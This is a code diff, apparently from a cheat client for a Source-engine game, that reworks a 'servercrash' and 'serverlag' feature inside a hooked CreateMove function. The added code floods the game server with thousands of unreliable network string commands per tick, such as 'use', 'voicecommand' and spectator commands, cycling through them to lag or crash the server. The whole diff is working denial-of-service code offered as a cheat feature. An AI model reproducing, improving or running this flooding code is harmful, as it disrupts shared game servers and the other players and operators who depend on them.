@@ -89,6 +89,7 @@ void RunEnginePrediction(IClientEntity *ent, CUserCmd *ucmd)
 #else
 #define antikick_time 90
 #endif
+const char *cmds[7] = {"use", "voicecommand", "spec_next", "spec_prev", "spec_player", "invprev", "invnext"};
 namespace hooked_methods
 {
 DEFINE_HOOKED_METHOD(CreateMove, bool, void *this_, float input_sample_time,
@@ -526,15 +527,23 @@ DEFINE_HOOKED_METHOD(CreateMove, bool, void *this_, float input_sample_time,
             g_Settings.last_angles = cmd->viewangles;
     }
 #endif
-    NET_StringCmd senddata(serverlag_string.GetString());
+    int nextdata = 0;
+    NET_StringCmd senddata(cmds[nextdata]);
     INetChannel *ch = (INetChannel *) g_IEngine->GetNetChannelInfo();
 
     senddata.SetNetChannel(ch);
     senddata.SetReliable(false);
     if (servercrash && DelayTimer.check((int) delay * 1000))
     {
-        for (int i = 0; i < 7800; i += sizeof(serverlag_string.GetString()))
+        for (int i = 0; i < 7800; i += sizeof(cmds[nextdata]))
+        {
+        	senddata.m_szCommand = cmds[nextdata];
             ch->SendNetMsg(senddata);
+            if (nextdata == 6)
+            	nextdata = 0;
+            else
+            	nextdata++;
+        }
         ch->Transmit();
     }
     if (serverlag_amount || (votelogger::active &&
@@ -570,15 +579,29 @@ DEFINE_HOOKED_METHOD(CreateMove, bool, void *this_, float input_sample_time,
             if (prevflowticks <= 10)
                 additionallag *= 0.1f;
             for (int i = 0; i < 7800 + additionallag;
-                 i += sizeof(serverlag_string.GetString()))
+                 i += sizeof(cmds[nextdata]))
+            {
+            	senddata.m_szCommand = cmds[nextdata];
                 ch->SendNetMsg(senddata, false);
+                if (nextdata == 6)
+                	nextdata = 0;
+                else
+                	nextdata++;
+            }
             ch->Transmit();
         }
         else if (!votelogger::active && serverlag_amount &&
                  DelayTimer.check((int) delay * 1000))
         {
             for (int i = 0; i < (int) serverlag_amount; i++)
+            {
+            	senddata.m_szCommand = cmds[nextdata];
+                if (nextdata == 6)
+                	nextdata = 0;
+                else
+                	nextdata++;
                 ch->SendNetMsg(senddata, false);
+            }
             ch->Transmit();
         }
         prevflow = ch->GetAvgData(FLOW_INCOMING);
